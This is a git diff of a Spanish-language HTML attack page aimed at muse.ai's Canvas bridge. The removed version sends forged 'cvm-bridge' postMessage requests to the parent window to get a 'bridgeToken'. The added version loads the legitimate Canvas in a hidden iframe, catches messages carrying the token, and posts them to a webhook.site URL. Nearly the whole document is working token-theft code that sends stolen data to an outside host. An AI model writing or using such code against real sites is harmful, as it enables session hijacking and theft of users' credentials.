@@ -1,78 +1,28 @@
 <!DOCTYPE html>
-<html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bridge Token Attack</title>
-    <style>
-        body { font-family: monospace; padding: 20px; background: #111; color: #0f0; }
-        h1 { color: #fff; }
-        #console { background: #000; padding: 15px; border: 1px solid #333; border-radius: 8px; min-height: 200px; white-space: pre-wrap; word-break: break-all; font-size: 12px; }
-        .success { color: #0f0; font-weight: bold; }
-        .error { color: #f00; }
-        .info { color: #ff0; }
-    </style>
-</head>
+<html>
 <body>
-    <h1>Forzando el bridgeToken...</h1>
-    <div id="console">Iniciando ataque...</div>
+    <h2>Interceptando Token Legítimo...</h2>
+    
+    <!-- Iframe invisible que carga un Canvas legítimo de Muse -->
+    <iframe id="legitCanvas" src="https://muse.ai/s/contador" style="display:none;"></iframe>
 
     <script>
-        const consola = document.getElementById('console');
         const webhookUrl = "https://webhook.site/118f2af5-6014-4c45-ab14-1543fc773f54";
 
-        function log(msg, className) {
-            const line = document.createElement('div');
-            line.className = className || '';
-            line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
-            consola.appendChild(line);
-            consola.scrollTop = consola.scrollHeight;
-        }
-
-        // 1. Escuchar la respuesta del padre
+        // 1. Escuchamos los mensajes que el padre le envía al iframe legítimo
         window.addEventListener("message", (event) => {
-            const dataString = JSON.stringify(event.data);
-            log("📩 Mensaje recibido de " + event.origin + ": " + dataString, "info");
-
-            // 2. Si contiene un token, exfiltrarlo
-            if (dataString.includes("bridgeToken") || dataString.includes("confirm-document")) {
-                log("🚨 ¡TOKEN ENCONTRADO! Exfiltlando...", "success");
-                fetch(`${webhookUrl}?bridge_token_stolen=true`, {
+            // Si el mensaje viene de muse.ai y contiene el token, lo robamos
+            if (event.origin === "https://muse.ai" && JSON.stringify(event.data).includes("bridgeToken")) {
+                const tokenData = JSON.stringify(event.data);
+                
+                // Exfiltramos el token al webhook
+                fetch(`${webhookUrl}?token_stolen=true`, {
                     method: 'POST',
                     mode: 'no-cors',
-                    body: dataString
+                    body: tokenData
                 });
             }
         });
-
-        // 3. Forzar al padre a enviar el token (simulando ser el Canvas legítimo)
-        // Enviamos varios tipos de mensajes para ver cuál responde el padre
-        const payloads = [
-            { type: "cvm-bridge:request-document" },
-            { type: "cvm-bridge:handshake" },
-            { type: "cvm-bridge:ready" },
-            { type: "cvm-bridge:get-document" },
-            { action: "request_bridge_token" },
-            { event: "request_token" }
-        ];
-
-        log("Enviando peticiones al padre...", "info");
-        
-        payloads.forEach((p, index) => {
-            setTimeout(() => {
-                try {
-                    // Enviamos al padre (muse.ai)
-                    window.parent.postMessage(p, "*");
-                    log("➡️ Enviado al padre: " + JSON.stringify(p), "info");
-                } catch (e) {
-                    log("❌ Error al enviar: " + e.message, "error");
-                }
-            }, index * 500); // Enviamos uno cada 500ms
-        });
-
-        log("Ataque iniciado. Esperando respuestas...", "success");
     </script>
-</body>
-</html>
 </body>
 </html>
